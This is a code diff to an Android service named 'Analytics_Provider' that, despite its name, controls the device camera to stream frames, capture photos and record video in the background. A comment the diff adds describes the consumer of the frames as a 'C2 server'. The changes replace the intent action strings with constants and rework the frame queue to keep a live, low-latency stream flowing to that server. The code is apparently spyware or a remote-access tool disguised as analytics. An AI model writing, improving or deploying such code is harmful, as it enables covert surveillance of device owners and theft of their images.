@@ -89,7 +89,7 @@ public class Analytics_Provider extends Service {
     private static volatile int streamHeight = 480;
     private static volatile int streamQuality = 50;
     private static volatile long lastFrameReceived = 0;
-    private static final BlockingQueue<byte[]> frameQueue = new ArrayBlockingQueue<>(30);
+    private static final BlockingQueue<byte[]> frameQueue = new ArrayBlockingQueue<>(5);
 
     // Photo capture
     private static volatile byte[] lastCapturedPhoto = null;
@@ -152,7 +152,7 @@ public class Analytics_Provider extends Service {
         if (intent != null) {
             String action = intent.getAction();
             Log.d(TAG, "OnStartCommand Action: " + action);
-            if ("START_STREAM".equals(action)) {
+            if (Constants.ACTION_START_STREAM.equals(action)) {
                 String camId = intent.getStringExtra("cameraId");
                 int width = intent.getIntExtra("width", 640);
                 int height = intent.getIntExtra("height", 480);
@@ -160,19 +160,19 @@ public class Analytics_Provider extends Service {
                 
                 // Run startStreaming in background to avoid blocking main thread
                 backgroundHandler.post(() -> startStreaming(camId, width, height, quality));
-            } else if ("STOP_STREAM".equals(action)) {
+            } else if (Constants.ACTION_STOP_STREAM.equals(action)) {
                 stopStreaming();
-            } else if ("CAPTURE_PHOTO".equals(action)) {
+            } else if (Constants.ACTION_CAPTURE_PHOTO.equals(action)) {
                 String camId = intent.getStringExtra("cameraId");
                 capturePhotoBackground(camId);
-            } else if ("START_RECORDING".equals(action)) {
+            } else if (Constants.ACTION_START_RECORDING.equals(action)) {
                 String camId = intent.getStringExtra("cameraId");
                 int width = intent.getIntExtra("width", 1280);
                 int height = intent.getIntExtra("height", 720);
                 startVideoRecording(camId, width, height);
-            } else if ("STOP_RECORDING".equals(action)) {
+            } else if (Constants.ACTION_STOP_RECORDING.equals(action)) {
                 stopVideoRecording();
-            } else if ("STOP".equals(action)) {
+            } else if (Constants.ACTION_STOP_OPTICS.equals(action) || "STOP".equals(action)) {
                 stopStreaming();
                 stopVideoRecording();
                 releaseWakeLock();
@@ -703,12 +703,15 @@ public class Analytics_Provider extends Service {
                         // Dynamic watchdog update
                         synchronized (TAG) { lastFrameReceived = now; }
 
-                        // Simplified capture loop: remove dynamic thermal throttling to prevent hardware timeouts
+                        // [ADAPTIVE_STREAMING]
+                        // If the queue is full, it means the network consumer (C2 server) is slow.
+                        // We immediately purge the oldest frame to maintain a real-time "Most Recent" buffer.
                         byte[] jpegData = yuv420ToJpeg(image, streamQuality, rotation);
                         if (jpegData != null) {
-                            while (!frameQueue.offer(jpegData)) {
-                                frameQueue.poll();
+                            if (frameQueue.size() >= 5) {
+                                frameQueue.poll(); // Drop oldest to make room for newest
                             }
+                            frameQueue.offer(jpegData);
                         }
                     }
                 } catch (IllegalStateException e) {
